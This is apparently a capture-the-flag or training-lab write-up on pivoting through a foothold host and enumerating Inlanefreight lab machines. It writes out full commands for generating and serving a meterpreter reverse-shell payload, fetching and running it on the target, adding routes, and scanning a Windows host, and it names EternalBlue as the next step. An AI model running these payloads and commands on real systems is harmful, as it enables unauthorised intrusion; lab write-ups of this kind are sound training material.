
The foothold can call back to my machine, so I will open a meterpreter reverse shell

## Preparation

### 1 -  {Attacking Machine}Generate Payload to call back home 
```
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o reverse.sh
```

### 2 - {Attacking Machine}Run msfconsole connection handler
```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_tcp; set LHOST tun0; set LPORT '4444'; run"
```

### 3 - {Attacking Machine}Starting a pyhton HTTP Server

The server is going to be started in the port 8080 and will be bind to **tun0 ** interface IP, therefore only accepting connections from that network

```
python3 -m http.server 8080 -b $(ip addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
```


### 4 - {Target Machine}Get the Payload from the attacking machine 

Attention to:

- That IP was mine at that moment
- filename was the defined earlier, when the payload was generated
- The output folder,  I choose **/tmp** , because usually there are no permissions problems.

```
curl http://10.10.14.249:8080/reverse.sh --output /tmp/shell.sh
```

Once the file is downloaded, you can shutdown the python server on the attacking machine

### 5 - {Target Machine}Grant execution permission and executing the payload

```
chmod u+x shell.sh
```

This grants the owner of the file permission to execute

Now, executes 

```
/tmp/shell.sh
```


This will grant us a meterpreter shell

### 6 - {Attacking Machine} Pivoting

As we  can see in the first command of the chapter [[The Live Engagement#HOST - 1]] , the  **/etc/hosts** file from the target machine,  some of our targets are in a network where out attacking machine does not have access, there for we will use the target machine as pivoting point by add the routes  the foothold machine has access

```
meterpreter > route

IPv4 network routes
===================

    Subnet      Netmask        Gateway     Metric  Interface
    ------      -------        -------     ------  ---------
    0.0.0.0     0.0.0.0        10.129.0.1  0       ens192
    10.129.0.0  255.255.0.0    0.0.0.0     0       ens192
    172.16.0.0  255.255.254.0  0.0.0.0     0       ens224
    172.17.0.0  255.255.0.0    0.0.0.0     0       docker0

```

Press "ctrl+z" to background the  meterpreter session 

```
meterpreter > 
Background session 1? [y/N]  
```

Now we will add the routes from the target machine, the data 

```
msf6 exploit(multi/handler) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) > set session 1
session => 1
msf6 post(multi/manage/autoroute) > run

[*] Running module against 10.129.204.126
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.254.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.0.0         255.255.254.0      Session 1
   172.17.0.0         255.255.0.0        Session 1
[*] There are currently no IPv6 routes defined.

```
---


## HOST - 1


## What is the hostname of Host-1? (Format: all lower case)

### 1.1

```
$ cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  skills-foothold
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local

```


###  1.2 add vhosts to local host file

```
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local
```

### 1.3 - Enumerating 


```
map -sCV -Pn -oX /tmp/status.nmap.xml status.inlanefreight.local
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-25 17:23 EDT
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.052s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Inlanefreight Server Status
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer       Microsoft lpd
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-25T21:24:41+00:00
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2024-04-24T20:41:58
|_Not valid after:  2024-10-24T20:41:58
|_ssl-date: 2024-04-25T21:24:46+00:00; 0s from scanner time.
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/10.0.11
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:2c:45 (VMware)
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-25T14:24:41-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-25T21:24:41
|_  start_date: N/A
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.99 seconds

```

> The asnwer is : **shells-winsvr**

## 2 -  Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)

As we can see in the nmap output, it has smb enabled, so lets try the lowest hanging fruit, the vulnarability named **MS17-010**, the good old **Eternal Blue**

```


```


---

## Host 2